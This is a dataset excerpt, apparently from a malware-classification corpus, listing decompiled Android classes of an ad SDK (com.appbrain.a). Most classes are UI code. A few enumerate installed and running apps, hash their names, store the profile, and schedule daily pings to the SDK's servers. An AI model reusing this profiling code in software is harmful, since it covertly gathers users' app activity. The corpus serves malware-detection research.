"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ay.code","final class ay implements Runnable {   final Context a;   final boolean b;   final a.C0006a c;   final boolean d=false;   final com.appbrain.a e=null;   final ax f;   public ay(  ax axVar,  Context context,  boolean z,  a.C0006a c0006a){     this.f=axVar;     this.a=context;     this.b=z;     this.c=c0006a;   }   @Override public final void run(){     a.a(this.a,this.b,this.c,this.d,this.e);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\az.code","public final class az {   private static final cmn.a a=cmn.a.a();   private static Set b;   private static AtomicBoolean c;   private static volatile long d; public static class a {     private long a;     private List b=Collections.synchronizedList(new ArrayList());     private final long c=System.currentTimeMillis() - 2592000000L;     private a(){     }     private static int[] a(    List list){       int[] iArr=new int[list.size()];       int i=0;       while (true) {         int i2=i;         if (i2 >= list.size()) {           return iArr;         }         int a=(int)(cmn.s.a(((PackageInfo)list.get(i2)).packageName) & (-1));         String str=((PackageInfo)list.get(i2)).packageName + "": "" + a;         iArr[i2]=a;         i=i2 + 1;       }     }     public static a b(){       return new a();     }     final long a(){       return this.a;     }     public final void a(    long j){       this.b.clear();       this.a=j;     }     public final void a(    PackageInfo packageInfo,    String str){       if (az.b == null || (str != null && az.b.contains(str))) {         long a=az.a.a(packageInfo);         if (a > this.c) {           this.b.add(packageInfo);         }         if (a <= 0 || a >= this.a) {           return;         }         if (packageInfo.applicationInfo == null || (packageInfo.applicationInfo.flags & 1) != 0) {           return;         }         this.a=a;       }     }     public final String c(){       try {         ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream(android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);         com.appbrain.b.e a=com.appbrain.b.e.a(byteArrayOutputStream);         a.c(5);         Collections.sort(this.b,new bc(this));         if (this.b.size() > 16) {           this.b=this.b.subList(0,16);           for (int i=0; i < this.b.size(); i++) {             String str=((PackageInfo)this.b.get(i)).packageName;           }         }         int[] a2=a(this.b);         a.c(a2.length);         for (        int i2 : a2) {           String str2=""Vector: "" + i2;           a.d(i2);         }         a.a();         return cmn.t.b(byteArrayOutputStream.toByteArray());       }  catch (      Exception e) {         e.printStackTrace();         return """";       }     }   } static {     HashSet hashSet=new HashSet();     b=hashSet;     hashSet.add(""com.android.vending"");     b.add(""com.google.android.feedback"");     c=new AtomicBoolean(false);     d=0L;   }   public static long a(){     return be.a().d().getLong(""pref_ola"",0L);   }   public static void a(  Context context){     long currentTimeMillis=System.currentTimeMillis();     if (currentTimeMillis < d) {       d=currentTimeMillis;     }     if (currentTimeMillis <= d + 3600000 || !c.compareAndSet(false,true)) {       return;     }     d=currentTimeMillis;     new Thread(new bb(context)).start();   }   public static void b(  Context context){     int i=0;     SharedPreferences d2=be.a().d();     try {       a b2=a.b();       b2.a(d2.getLong(""pref_ola"",System.currentTimeMillis()));       FutureTask futureTask=new FutureTask(new ba(context,b2));       cmn.e.a(futureTask);       List<ActivityManager.RunningAppProcessInfo> list=(List)futureTask.get(10L,TimeUnit.SECONDS);       if (list != null) {         ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();         com.appbrain.b.e a2=com.appbrain.b.e.a(byteArrayOutputStream);         for (        ActivityManager.RunningAppProcessInfo runningAppProcessInfo : list) {           a2.c(runningAppProcessInfo.importance / 10);           a2.d((int)(cmn.s.a(runningAppProcessInfo.pkgList[0]) & (-1)));           String str=""Adding active app "" + runningAppProcessInfo.pkgList[0];           int i2=i + 1;           if (i2 >= 16) {             break;           }  else {             i=i2;           }         }         a2.c(0);         a2.a();         String b3=cmn.t.b(byteArrayOutputStream.toByteArray());         SharedPreferences.Editor edit=d2.edit();         if (b3 != null) {           edit.putString(""pref_aav"",b3);         }         edit.putString(""pref_tv"",b2.c());         edit.putLong(""pref_ola"",b2.a());         cmn.a.a().b(edit);       }     }  catch (    Throwable th) {       th.printStackTrace();     }   }   public static byte[] b(){     String string=be.a().d().getString(""pref_tv"",null);     if (string == null) {       return null;     }     try {       return cmn.t.b(string);     }  catch (    ParseException e) {       e.printStackTrace();       return null;     }   }   public static byte[] c(){     String string=be.a().d().getString(""pref_aav"",null);     if (string == null) {       return null;     }     try {       return cmn.t.b(string);     }  catch (    ParseException e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\b.code","public static class b {   private a a;   private a b;   private a c;   private a d;   private String e;   private b(){     this.e=null;   }   public b(  byte b){     this();   }   public final b a(  a aVar){     this.a=aVar;     return this;   }   public final b b(  a aVar){     this.b=aVar;     return this;   }   public final b c(  a aVar){     this.c=aVar;     return this;   }   public final b d(  a aVar){     this.d=aVar;     return this;   } } final class b extends PaintDrawable {   Paint a=new Paint();   final com.appbrain.d.a b;   final bx.a c;   public b(  bx.a aVar,  com.appbrain.d.a aVar2){     this.c=aVar;     this.b=aVar2;     this.a.setMaskFilter(new BlurMaskFilter(cmn.ab.a(4.0f),BlurMaskFilter.Blur.OUTER));     this.a.setColor(Integer.MIN_VALUE);     setShape(this.b.getShape());   }   @Override protected final void onDraw(  Shape shape,  Canvas canvas,  Paint paint){     super.onDraw(shape,canvas,paint);     shape.draw(canvas,this.a);   } } public static class b implements g {   @Override public final int a(){     return bx.c.nextInt(bx.a.length);   }   @Override public final View a(  Context context,  String str,  String str2,  String str3,  String str4,  e eVar,  View.OnClickListener onClickListener){     e eVar2=new e();     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     cmn.a.a().a(linearLayout,new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{eVar2.a,eVar2.b}));     ImageView imageView=new ImageView(context);     imageView.setImageDrawable(new com.appbrain.d.h(context,str3));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(cmn.ab.b(38.0f),cmn.ab.b(38.0f));     layoutParams.gravity=17;     layoutParams.leftMargin=cmn.ab.b(4.0f);     layoutParams.rightMargin=cmn.ab.b(4.0f);     linearLayout.addView(imageView,layoutParams);     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(1);     cmn.x xVar=new cmn.x(context);     xVar.setMaxLines(1);     xVar.setTypeface(xVar.getTypeface(),1);     xVar.setText(str);     xVar.setTextSize(0,cmn.ab.a(12.0f));     xVar.setTextColor(eVar2.c);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-1,-2);     linearLayout2.addView(xVar,layoutParams2);     cmn.x xVar2=new cmn.x(context);     xVar2.setMaxLines(2);     xVar2.setText(str2);     xVar2.setTextSize(0,cmn.ab.a(9.0f));     xVar2.setTextColor(eVar2.c);     linearLayout2.addView(xVar2,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.gravity=19;     layoutParams3.weight=2.0f;     layoutParams3.leftMargin=cmn.ab.b(4.0f);     layoutParams3.rightMargin=cmn.ab.b(4.0f);     linearLayout.addView(linearLayout2,layoutParams3);     ImageButton imageButton=new ImageButton(context);     imageButton.setScaleType(ImageView.ScaleType.CENTER_INSIDE);     imageButton.setImageDrawable(bx.b(eVar2.g));     com.appbrain.d.a aVar=new com.appbrain.d.a(new RectShape());     aVar.a().setColor(bx.c(eVar2.e));     aVar.a().setStrokeWidth(cmn.ab.b(1.0f));     aVar.setShaderFactory(new com.appbrain.a.c(this,eVar2));     cmn.a.a().a(imageButton,com.appbrain.d.c.b(context,aVar));     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(cmn.ab.b(38.0f),cmn.ab.b(38.0f));     layoutParams4.gravity=17;     layoutParams4.leftMargin=cmn.ab.b(6.0f);     layoutParams4.rightMargin=cmn.ab.b(6.0f);     imageButton.setOnClickListener(onClickListener);     linearLayout.addView(imageButton,layoutParams4);     return linearLayout;   } } public class b {   public ProgressBar a;   public TextView b;   public ImageView c;   public TextView d;   public TextView e;   public e f;   public TextView g;   public TextView h;   public b(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ba.code","public final class ba implements Callable {   final Context a;   final az.a b;   public ba(  Context context,  az.a aVar){     this.a=context;     this.b=aVar;   }   @Override public List call(){     ArrayList arrayList=new ArrayList();     try {       PackageManager packageManager=this.a.getPackageManager();       for (      ActivityManager.RunningAppProcessInfo runningAppProcessInfo : ((ActivityManager)this.a.getSystemService(""activity"")).getRunningAppProcesses()) {         if (runningAppProcessInfo.pkgList.length > 0 && ""com.android.vending"".equals(packageManager.getInstallerPackageName(runningAppProcessInfo.pkgList[0]))) {           arrayList.add(runningAppProcessInfo);         }       }       for (      PackageInfo packageInfo : packageManager.getInstalledPackages(0)) {         this.b.a(packageInfo,packageManager.getInstallerPackageName(packageInfo.packageName));       }       return arrayList;     }  catch (    Throwable th) {       th.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bb.code","public final class bb implements Runnable {   final Context a;   public bb(  Context context){     this.a=context;   }   @Override public final void run(){     AtomicBoolean atomicBoolean;     try {       az.b(this.a);     }   finally {       atomicBoolean=az.c;       atomicBoolean.set(false);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bc.code","public final class bc implements Comparator {   final az.a a;   public bc(  az.a aVar){     this.a=aVar;   }   @Override public final int compare(  Object obj,  Object obj2){     return (int)((-(az.a.a((PackageInfo)obj) - az.a.a((PackageInfo)obj2))) / 1000);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bd.code","public final class bd extends com.appbrain.f.c {   private static bd b=null;   private final ap c;   private bd(  Context context,  c.a aVar){     super(context);     this.c=new ac(context);     a(aVar);   }   public static synchronized bd a(  Context context){     bd bdVar; synchronized (bd.class) {       if (b == null) {         be.a().a(context,false);         b=new bd(context,ap.a(ax.a().d(),be.a().a(""ppath"",""/api/pb?action="")));       }       bdVar=b;     }     return bdVar;   }   private Object a(  com.appbrain.b.g gVar,  String str,  com.appbrain.b.o oVar){     byte[] b2=super.b(gVar,str);     if (b2 == null) {       return null;     }     return oVar.a(b2);   }   public final a.e a(  j.i iVar){     return (a.e)a(iVar,""ev"",a.e.a);   }   public final a.e a(  j.k kVar){     return (a.e)a(kVar,""ai"",a.e.a);   }   public final j.b a(  j.f fVar){     return (j.b)a(fVar,""ba"",j.b.a);   }   @Override protected final a.C0018a.C0019a a(  com.appbrain.b.g gVar,  String str){     return this.c.a(gVar,str);   }   @Override public final byte[] b(  com.appbrain.b.g gVar,  String str){     return super.b(gVar,str);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\be.code","public final class be {   private static final be a=new be();   private com.appbrain.e d;   private SharedPreferences e;   private Context f;   private as g;   private final AtomicBoolean b=new AtomicBoolean(false);   private final Timer c=new Timer(true);   private boolean h=true;   private be(){   }   public static be a(){     return a;   }   public static void b(  be beVar){     t.a(beVar.f,(a.c)null);     SharedPreferences.Editor edit=beVar.e.edit();     edit.putInt(""pingcount"",beVar.e.getInt(""pingcount"",0) + 1);     cmn.a.a().a(edit);   }   public synchronized void k(){     if (this.g == null) {       this.g=new bf(this,""ping"",Integer.parseInt(this.d.a(""ping_interval"",""86400"")) * 1000);     }     this.c.schedule(new bh(this),10000L);   }   public final double a(  String str,  double d){     try {       return Double.parseDouble(this.d.a(str));     }  catch (    Exception e) {       return d;     }   }   public final int a(  String str,  int i){     try {       return Integer.parseInt(this.d.a(str));     }  catch (    Exception e) {       return i;     }   }   public final String a(  String str,  String str2){     return this.d.a(str,str2);   }   public final synchronized void a(  Context context,  boolean z){     Context applicationContext=context.getApplicationContext();     if (this.f == null) {       this.f=applicationContext;       try {         applicationContext.getPackageManager().getServiceInfo(new ComponentName(applicationContext,""com.appbrain.AppBrainService""),0);         if (applicationContext.checkCallingOrSelfPermission(""android.permission.INTERNET"") != 0) {           throw new IllegalStateException(""Add the INTERNET permission to your Android manifest!"");         }         cmn.ab.a(applicationContext);       }  catch (      PackageManager.NameNotFoundException e) {         throw new IllegalStateException(""No AppBrainService defined in the manifest!"");       }     }     if (this.d == null) {       this.d=an.a(applicationContext,true);       this.e=applicationContext.getSharedPreferences(""ab_sdk_pref"",0);     }     az.a(applicationContext);     if (z) {       SharedPreferences.Editor edit=this.e.edit();       edit.putInt(""init_called"",this.e.getInt(""init_called"",0) + 1);       cmn.a.a().a(edit);       k();     }     if (a(""sdk_off"",0) != 0) {       this.b.set(true);     }   }   public final void a(  String str){     SharedPreferences.Editor edit=this.e.edit();     edit.putString(""ref"",str);     cmn.a.a().a(edit);   }   public final synchronized boolean b(){     return this.f != null;   }   public final boolean c(){     return this.b.get() || Build.VERSION.SDK_INT < 8;   }   public final SharedPreferences d(){     return this.e;   }   public final boolean e(){     return this.h;   }   public final void f(){     this.h=false;   }   public final String g(){     return this.d.a(""pserver"",""http://sdk.appbrain.com,http://sdk-b.apptornado.com"");   }   public final Context h(){     return this.f;   }   public final boolean i(){     try {       NetworkInfo activeNetworkInfo=((ConnectivityManager)this.f.getSystemService(""connectivity"")).getActiveNetworkInfo();       if (activeNetworkInfo != null) {         if (activeNetworkInfo.isConnectedOrConnecting()) {           return true;         }       }       return false;     }  catch (    Exception e) {       return true;     }   }   public final String j(){     return this.e.getString(""ref"",null);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bf.code","public final class bf extends as {   final be a;   public bf(  be beVar,  String str,  long j){     super(str,j);     this.a=beVar;   }   @Override protected final SharedPreferences a(  Context context){     SharedPreferences sharedPreferences;     sharedPreferences=this.a.e;     return sharedPreferences;   }   @Override public final void a(){     Timer timer;     try {       be.b(this.a);     }  catch (    Exception e) {       bg bgVar=new bg(this);       timer=this.a.c;       timer.schedule(bgVar,60000L);       throw e;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bg.code","final class bg extends TimerTask {   final bf a;   public bg(  bf bfVar){     this.a=bfVar;   }   @Override public final void run(){     this.a.a.k();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bh.code","public final class bh extends TimerTask {   final be a;   public bh(  be beVar){     this.a=beVar;   }   @Override public final void run(){     as asVar;     Context context;     asVar=this.a.g;     context=this.a.f;     asVar.b(context);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bi.code","public class bi implements AppBrainActivity.a {   static final String a=bi.class.getName() + "".ao"";   static final String b=bi.class.getName() + "".wm"";   private Activity c;   private j d;   public bi(  Activity activity){     this.c=activity;   }   @Override public final void a(){     this.c.setContentView(this.d.a());   }   @Override public final void a(  Bundle bundle){     this.d=new j(this.c,bundle,(com.appbrain.a)this.c.getIntent().getSerializableExtra(a),j.d.ACTIVITY,this.c.getIntent().getBooleanExtra(b,false),new bj(this));     this.c.requestWindowFeature(1);     this.c.setContentView(this.d.a());   }   @Override public final boolean a(  int i){     return false;   }   @Override public final void b(){   }   @Override public final void b(  Bundle bundle){     this.d.a(bundle);   }   @Override public final boolean c(){     return true;   }   @Override public final void d(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bj.code","final class bj implements Runnable {   final bi a;   public bj(  bi biVar){     this.a=biVar;   }   @Override public final void run(){     Activity activity;     activity=this.a.c;     activity.finish();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bk.code","public final class bk implements View.OnClickListener {   final j a;   public bk(  j jVar){     this.a=jVar;   }   @Override public final void onClick(  View view){     Runnable runnable;     runnable=this.a.k;     runnable.run();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bl.code","public final class bl implements cmn.aa {   final j.b a;   final j.c b;   final j c;   public bl(  j jVar,  j.b bVar,  j.c cVar){     this.c=jVar;     this.a=bVar;     this.b=cVar;   }   @Override public final void a(  Object obj){     j.a(this.c,(j.b)obj,this.a,this.b.a());   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bm.code","public final class bm implements View.OnClickListener {   final String a;   final boolean b;   final String c;   final String d;   final String e;   final j f;   public bm(  j jVar,  String str,  boolean z,  String str2,  String str3,  String str4){     this.f=jVar;     this.a=str;     this.b=z;     this.c=str2;     this.d=str3;     this.e=str4;   }   @Override public final void onClick(  View view){     Context context;     Runnable runnable;     Context context2;     context=this.f.j;     ak.a(context,this.a);     if (this.b) {       context2=this.f.j;       ak.a(context2,this.c,this.d,this.e);     }     runnable=this.f.k;     runnable.run();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bn.code","public final class bn extends Drawable {   final RectF a;   final int b;   final int c;   final Paint d;   final int e;   final Paint f;   final j g;   private int h;   private int i;   public bn(  j jVar,  RectF rectF,  int i,  int i2,  Paint paint,  int i3,  Paint paint2){     this.g=jVar;     this.a=rectF;     this.b=i;     this.c=i2;     this.d=paint;     this.e=i3;     this.f=paint2;   }   @Override public final void draw(  Canvas canvas){     this.a.set(this.b,this.b,this.h - this.b,this.i - this.b);     canvas.drawRoundRect(this.a,this.c,this.c,this.d);     this.a.set(this.e,this.e,this.h - this.e,this.i - this.e);     canvas.drawRoundRect(this.a,this.c,this.c,this.f);   }   @Override public final int getOpacity(){     return 0;   }   @Override protected final void onBoundsChange(  Rect rect){     super.onBoundsChange(rect);     this.h=rect.width();     this.i=rect.height();   }   @Override public final void setAlpha(  int i){   }   @Override public final void setColorFilter(  ColorFilter colorFilter){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bo.code","public final class bo extends ShapeDrawable {   final Paint a;   final j b;   public bo(  j jVar,  Shape shape,  Paint paint){     super(shape);     this.b=jVar;     this.a=paint;   }   @Override protected final void onDraw(  Shape shape,  Canvas canvas,  Paint paint){     super.onDraw(shape,canvas,paint);     int width=(int)(shape.getWidth() * 0.3f);     int width2=((int)shape.getWidth()) - width;     int height=(int)(shape.getHeight() * 0.3f);     int height2=((int)shape.getHeight()) - height;     canvas.drawLine(width,height,width2,height2,this.a);     canvas.drawLine(width,height2,width2,height,this.a);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bp.code","public class bp extends Fragment {   private static final String a=bp.class.getName();   private j b;   public static void a(  Activity activity,  com.appbrain.a aVar,  boolean z){     FragmentManager fragmentManager=activity.getFragmentManager();     int backStackEntryCount=fragmentManager.getBackStackEntryCount();     FragmentManager.BackStackEntry backStackEntryAt=backStackEntryCount == 0 ? null : fragmentManager.getBackStackEntryAt(backStackEntryCount - 1);     if (TextUtils.equals(backStackEntryAt != null ? backStackEntryAt.getName() : null,a)) {       fragmentManager.popBackStack();     }     Bundle bundle=new Bundle();     bundle.putSerializable(""op"",aVar);     bundle.putSerializable(""mb"",Boolean.valueOf(z));     bp bpVar=new bp();     bpVar.setArguments(bundle);     fragmentManager.beginTransaction().add(R.id.content,bpVar).setTransition(android.support.v4.app.e.TRANSIT_FRAGMENT_FADE).addToBackStack(a).commit();   }   public static void a(  bp bpVar){     FragmentManager fragmentManager=bpVar.getFragmentManager();     if (fragmentManager != null) {       fragmentManager.popBackStack();     }   }   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     this.b=new j(getActivity(),bundle,(com.appbrain.a)getArguments().getSerializable(""op""),j.d.FRAGMENT,getArguments().getBoolean(""mb""),new bq(this));   }   @Override public View onCreateView(  LayoutInflater layoutInflater,  ViewGroup viewGroup,  Bundle bundle){     View a2=this.b.a();     long elapsedRealtime=SystemClock.elapsedRealtime();     a2.setFocusableInTouchMode(true);     a2.requestFocus();     a2.setOnKeyListener(new br(this,elapsedRealtime));     return a2;   }   @Override public void onSaveInstanceState(  Bundle bundle){     super.onSaveInstanceState(bundle);     this.b.a(bundle);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bq.code","final class bq implements Runnable {   final bp a;   public bq(  bp bpVar){     this.a=bpVar;   }   @Override public final void run(){     bp.a(this.a);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\br.code","final class br implements View.OnKeyListener {   final long a;   final bp b;   public br(  bp bpVar,  long j){     this.b=bpVar;     this.a=j;   }   @Override public final boolean onKey(  View view,  int i,  KeyEvent keyEvent){     if (i != 4) {       return false;     }     if (SystemClock.elapsedRealtime() >= this.a + 1500) {       bp.a(this.b);     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bs.code","public class bs implements j.c {   private static ViewGroup c(  Context context,  j.b bVar){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     linearLayout.addView(bVar.b,new LinearLayout.LayoutParams(-2,-2));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(0,0);     layoutParams.weight=1.0f;     linearLayout.addView(new View(context),layoutParams);     linearLayout.addView(bVar.c,new LinearLayout.LayoutParams(-2,-2));     return linearLayout;   }   @Override public final ViewGroup a(  Context context,  j.b bVar){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(1);     linearLayout.setGravity(1);     linearLayout.setPadding(cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     layoutParams.bottomMargin=cmn.ab.b(16.0f);     linearLayout.addView(c(context,bVar),layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.bottomMargin=cmn.ab.b(36.0f);     linearLayout.addView(bVar.a,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.setMargins(cmn.ab.b(16.0f),0,cmn.ab.b(16.0f),cmn.ab.b(16.0f));     linearLayout.addView(bVar.d,layoutParams3);     bVar.d.setGravity(1);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(cmn.ab.b(128.0f),cmn.ab.b(128.0f));     layoutParams4.bottomMargin=cmn.ab.b(16.0f);     linearLayout.addView(bVar.f,layoutParams4);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,-2);     layoutParams5.setMargins(cmn.ab.b(16.0f),0,cmn.ab.b(16.0f),cmn.ab.b(16.0f));     linearLayout.addView(bVar.e,layoutParams5);     bVar.e.setGravity(1);     linearLayout.addView(bVar.g,new LinearLayout.LayoutParams(-2,-2));     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,-2);     layoutParams6.topMargin=cmn.ab.b(16.0f);     linearLayout.addView(bVar.h,layoutParams6);     bVar.h.setGravity(1);     return linearLayout;   }   @Override public final boolean a(){     return false;   }   @Override public final ViewGroup b(  Context context,  j.b bVar){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(1);     linearLayout.setPadding(cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     layoutParams.bottomMargin=cmn.ab.b(16.0f);     linearLayout.addView(c(context,bVar),layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.bottomMargin=cmn.ab.b(36.0f);     layoutParams2.gravity=1;     linearLayout.addView(bVar.a,layoutParams2);     ViewGroup.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(0);     linearLayout2.addView(bVar.f,new LinearLayout.LayoutParams(cmn.ab.b(128.0f),cmn.ab.b(128.0f)));     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,-2);     layoutParams4.leftMargin=cmn.ab.b(8.0f);     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     linearLayout3.setGravity(1);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,-2);     layoutParams5.setMargins(cmn.ab.b(16.0f),0,cmn.ab.b(16.0f),cmn.ab.b(8.0f));     linearLayout3.addView(bVar.d,layoutParams5);     bVar.d.setGravity(1);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,-2);     layoutParams6.setMargins(cmn.ab.b(16.0f),0,cmn.ab.b(16.0f),cmn.ab.b(16.0f));     linearLayout3.addView(bVar.e,layoutParams6);     bVar.e.setGravity(1);     linearLayout3.addView(bVar.g,new LinearLayout.LayoutParams(-2,-2));     linearLayout2.addView(linearLayout3,layoutParams4);     linearLayout.addView(linearLayout2,layoutParams3);     LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(-1,-2);     layoutParams7.topMargin=cmn.ab.b(8.0f);     linearLayout.addView(bVar.h,layoutParams7);     return linearLayout;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bt.code","public class bt implements j.c {   @Override public final ViewGroup a(  Context context,  j.b bVar){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(1);     linearLayout.setGravity(1);     linearLayout.setPadding(cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);     layoutParams.bottomMargin=cmn.ab.b(8.0f);     layoutParams.gravity=5;     linearLayout.addView(bVar.c,layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.bottomMargin=cmn.ab.b(36.0f);     linearLayout.addView(bVar.a,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.setMargins(cmn.ab.b(16.0f),0,cmn.ab.b(16.0f),cmn.ab.b(16.0f));     linearLayout.addView(bVar.d,layoutParams3);     bVar.d.setGravity(1);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(cmn.ab.b(128.0f),cmn.ab.b(128.0f));     layoutParams4.bottomMargin=cmn.ab.b(16.0f);     linearLayout.addView(bVar.f,layoutParams4);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,-2);     layoutParams5.setMargins(cmn.ab.b(16.0f),0,cmn.ab.b(16.0f),cmn.ab.b(16.0f));     linearLayout.addView(bVar.e,layoutParams5);     bVar.e.setGravity(1);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-2,-2);     layoutParams6.bottomMargin=cmn.ab.b(16.0f);     linearLayout.addView(bVar.b,layoutParams6);     linearLayout.addView(bVar.g,new LinearLayout.LayoutParams(-2,-2));     LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(-1,-2);     layoutParams7.topMargin=cmn.ab.b(16.0f);     linearLayout.addView(bVar.h,layoutParams7);     bVar.h.setGravity(1);     return linearLayout;   }   @Override public final boolean a(){     return false;   }   @Override public final ViewGroup b(  Context context,  j.b bVar){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(1);     linearLayout.setPadding(cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f));     ViewGroup.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(0);     ViewGroup.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(cmn.ab.b(128.0f),cmn.ab.b(128.0f));     layoutParams3.bottomMargin=cmn.ab.b(8.0f);     linearLayout3.addView(bVar.f,layoutParams3);     linearLayout3.addView(bVar.g,new LinearLayout.LayoutParams(-2,-2));     linearLayout2.addView(linearLayout3,layoutParams2);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,-2);     layoutParams4.leftMargin=cmn.ab.b(8.0f);     LinearLayout linearLayout4=new LinearLayout(context);     linearLayout4.setOrientation(1);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,-2);     layoutParams5.bottomMargin=cmn.ab.b(8.0f);     LinearLayout linearLayout5=new LinearLayout(context);     linearLayout5.setOrientation(0);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(0,-2);     